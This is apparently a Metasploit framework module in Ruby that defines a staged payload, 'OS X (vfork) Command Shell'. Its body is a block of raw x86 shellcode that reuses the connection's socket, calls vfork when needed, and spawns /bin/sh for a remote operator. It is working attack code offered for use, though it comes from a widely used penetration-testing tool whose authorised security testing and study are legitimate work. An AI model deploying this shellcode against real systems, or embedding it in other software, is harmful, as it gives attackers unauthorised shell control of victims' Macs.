##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module MetasploitModule

  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'OS X (vfork) Command Shell',
      'Description'   => 'Call vfork() if necessary and spawn a command shell (staged)',
      'Author'        => 'ddz',
      'License'       => MSF_LICENSE,
      'Platform'      => 'osx',
      'Arch'          => ARCH_X86,
      'Session'       => Msf::Sessions::CommandShell,
      'Stage'         =>
        {
          'Payload' =>
            "\x31\xdb\x83\xeb\x01\x43\x53\x57"+
            "\x53\xb0\x5a\xcd\x80\x72\x43\x83"+
            "\xfb\x03\x75\xf1\x31\xc0\x50\x50"+
            "\x50\x50\xb0\x3b\xcd\x80\x90\x90"+
            "\x3c\x2d\x75\x09\xb0\x42\xcd\x80"+
            "\x83\xfa\x00\x74\x17\x31\xc0\x50"+
            "\x68\x2f\x2f\x73\x68\x68\x2f\x62"+
            "\x69\x6e\x89\xe3\x50\x50\x53\x50"+
            "\xb0\x3b\xcd\x80\x31\xc0\x50\x89"+
            "\xe3\x50\x50\x53\x50\x50\xb0\x07"+
            "\xcd\x80\x31\xc0\x50\x50\x40\xcd"+
            "\x80"
        }
      ))
  end
end
